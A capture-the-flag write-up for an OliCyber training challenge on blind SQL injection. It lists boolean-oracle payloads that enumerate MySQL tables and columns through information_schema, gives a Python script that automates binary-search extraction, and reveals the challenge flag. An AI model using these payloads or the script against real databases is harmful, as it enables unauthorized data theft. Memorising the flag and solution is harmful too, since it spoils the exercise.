# URL
https://training.olicyber.it/challenges#challenge-358

# Concept
Performing Blind SQL Injection

# Method of Solve
- Go to the Challenge Interface
- Navigate to the Target URL at http://web-17.challs.olicyber.it/blind
- The application takes an input and embeds it in the query:
  ```
    SELECT * FROM main WHERE id='<input>'
  ```
- It returns **"Success"** if rows are returned, **"Failure"** otherwise — a boolean oracle
- Break out of the string and add a condition:
  ```
    0' OR 1=1 -- 
  ```
  Query becomes:
  ```
    SELECT * FROM main WHERE id='0' OR 1=1 -- '
  ```
  Result: **Success** (true)
- False test:
  ```
    0' OR 1=2 -- 
  ```
  Result: **Failure** (false)
- Identify the database engine by checking if `information_schema` exists:
  ```
    0' OR (SELECT count(*) FROM information_schema.tables)>=1 -- 
  ```
  Result: **Success** → MySQL
- Find the number of tables in the database:
  ```
    0' OR (SELECT count(*) FROM information_schema.tables WHERE table_schema=DATABASE())=2 -- 
  ```
  Result: **Success** → 2 tables exist
- Extract table names using binary search on ASCII values:
  ```
    0' OR ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))=109 -- 
  ```
  Table 0 (OFFSET 0) extracts to: **main**
  Table 1 (OFFSET 1) extracts to: **secret**
- Find the number of columns in the `secret` table:
  ```
    0' OR (SELECT count(*) FROM information_schema.columns WHERE table_name='secret' AND table_schema=DATABASE())=2 -- 
  ```
  Result: **Success** → 2 columns
- Extract column names:
  ```
    0' OR ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='secret' AND table_schema=DATABASE() ORDER BY ordinal_position LIMIT 1 OFFSET 0),1,1))=105 -- 
  ```
  Column 0: **id**
  Column 1: **asecret**
- Check number of rows in `secret`:
  ```
    0' OR (SELECT count(*) FROM secret)=1 -- 
  ```
  Result: **Success** → 1 row
- Extract the flag from `asecret` column, character by character:
  ```
    0' OR ASCII(SUBSTR((SELECT asecret FROM secret LIMIT 1 OFFSET 0),1,1))=102 -- 
  ```
  Continue for each position → **flag{A_bl1ndy_fl4g}**

# Final Script
```python
import requests, re, sys

BASE_URL = "http://web-17.challs.olicyber.it"

s = requests.Session()
resp = s.get(f"{BASE_URL}/blind")
csrf = re.search(r"csrf_token\s*=\s*'([^']+)'", resp.text).group(1)

def test(condition):
    headers = {"X-CSRFToken": csrf, "Content-Type": "application/json"}
    payload = f"0' OR {condition} -- "
    data = {"query": payload}
    resp = s.post(f"{BASE_URL}/api/blind", headers=headers, json=data)
    return resp.json()["result"] == "Success"

def extract_string(subquery, max_len=200):
    length = None
    for l in range(1, max_len + 1):
        if test(f"(SELECT length(({subquery})))={l}"):
            length = l
            break
    if length is None:
        return None
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            if test(f"ASCII(SUBSTR(({subquery}),{pos},1))<={mid}"):
                high = mid
            else:
                low = mid + 1
        result += chr(low)
        sys.stdout.write(f"\r[+] {result}")
        sys.stdout.flush()
    print()
    return result

# Discover tables
for offset in range(5):
    subq = f"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET {offset}"
    if not test(f"(SELECT count(*) FROM information_schema.tables WHERE table_schema=DATABASE())>{offset}"):
        break
    print(f"[+] Table {offset}: {extract_string(subq)}")

# Extract flag from secret.asecret
flag = extract_string("SELECT asecret FROM secret LIMIT 1 OFFSET 0", 300)
print(f"\n[+] Flag: {flag}")
```
- so the flag is **flag{A_bl1ndy_fl4g}**
